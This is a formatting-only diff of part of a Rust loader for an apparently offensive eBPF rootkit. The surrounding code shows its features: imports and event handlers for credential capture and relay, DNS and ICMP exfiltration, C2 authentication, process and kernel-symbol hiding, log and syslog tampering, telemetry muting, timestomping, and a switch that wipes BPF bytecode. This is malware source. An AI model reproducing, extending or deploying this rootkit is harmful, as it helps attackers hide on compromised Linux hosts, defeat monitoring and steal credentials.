@@ -12,13 +12,13 @@ use aya_log::EbpfLogger;
 use bytes::BytesMut;
 use clap::Parser;
 use common::{
-    CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig,
-    TimestompEntry, BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
-    EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE,
-    EVENT_CRED_RELAYED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL,
-    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE,
-    EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED,
-    EVENT_SYSLOG_STRIPPED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
+    CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig, TimestompEntry,
+    BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED,
+    EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE, EVENT_CRED_RELAYED,
+    EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL, EVENT_KALLSYMS_HIDDEN,
+    EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN,
+    EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
+    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
 };
 use log::{debug, error, info, warn};
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
@@ -413,7 +413,8 @@ async fn main() -> Result<()> {
         wipe_check.attach("__x64_sys_getpid", 0)?;
         if cli.wipe_bytecode {
             let mut wipe_flag: HashMap<_, u32, u32> = HashMap::try_from(
-                bpf.map_mut("WIPE_FLAG").context("WIPE_FLAG map not found")?,
+                bpf.map_mut("WIPE_FLAG")
+                    .context("WIPE_FLAG map not found")?,
             )?;
             wipe_flag.insert(0u32, 1u32, 0)?;
             info!("✓ Feature 19: Bytecode Wipe ACTIVATED — programs are now no-ops");
@@ -866,10 +867,7 @@ fn log_event(event: &EventHeader) {
             debug!("ICMP exfil sent: seq={}", event.context);
         }
         EVENT_SOCKET_CLONED => {
-            debug!(
-                "Socket cloned: PID={}, cookie={}",
-                event.pid, event.context
-            );
+            debug!("Socket cloned: PID={}, cookie={}", event.pid, event.context);
         }
         EVENT_CRED_RELAYED => {
             info!(
